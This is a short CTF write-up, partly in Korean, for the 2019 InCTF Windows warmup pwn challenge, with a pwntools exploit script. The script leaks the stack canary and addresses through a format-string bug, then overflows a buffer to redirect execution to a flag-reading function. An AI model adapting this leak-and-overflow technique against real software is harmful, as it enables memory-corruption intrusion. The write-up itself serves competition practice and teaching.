---
title: InCTF warmup write up
categories: [2019, InCTF]
tags: [CTF, window, fsb, bof, easy]
---

InCTF write up

subject   | problem
----------|------------
CTF       | 2019 InCTF
Tags      | pwn
score     | x
env       | window
problem   | x64, fsb, bof, easy

# analysis
window 기본 bof문제이다.
window의 카나리는 ebp와 계산하기 때문에 ebp의 주소를 알아야 하는데, 그 때문에 fsb 취약점을 준 것 같다. (마음만 먹으면 fsb로도 exploit 할 수 있을 것 같지만 warmup 이므로..) eip는 flag.txt를 읽어주는 함수를 만들었는데 그 함수로 돌리면 된다.

# solve
1. fsb를 이용해서 ebp와 codebase를 구한다.
2. bof를 이용해서 eip 컨트롤 && get flag

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

host = "54.224.176.60"
port = 1414

def pwn():
    s.recvuntil(":")
    payload = "%p "*10
    payload += "CANARY%p EBP%p EIP%p "
    s.sendline(payload)

    s.recvuntil("CANARY")
    canary = int(s.recvuntil(" ")[:-1], 16)
    s.recvuntil("EBP")
    ebp = int(s.recvuntil(" ")[:-1], 16)
    s.recvuntil("EIP")
    code_base = int(s.recvuntil(" ")[:-1], 16) - 0x0406D27
    #realcanary = ebp ^ canary
    realcanary = (ebp-0x4c) ^ canary

    log.info("canary     : " +str(hex(canary)))
    log.info("ebp        : " +str(hex(ebp)))
    log.info("realcanary : " +str(hex(realcanary)))
    log.info("code_base  : " +str(hex(code_base)))

    canary = (ebp) ^ realcanary

    payload = "A"*0x40
    payload += p32(canary)
    payload += p32(ebp+0x48)
    payload += p32(code_base + 0x0406C80)

    s.recvuntil(":")
    s.sendline(payload)


if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()

```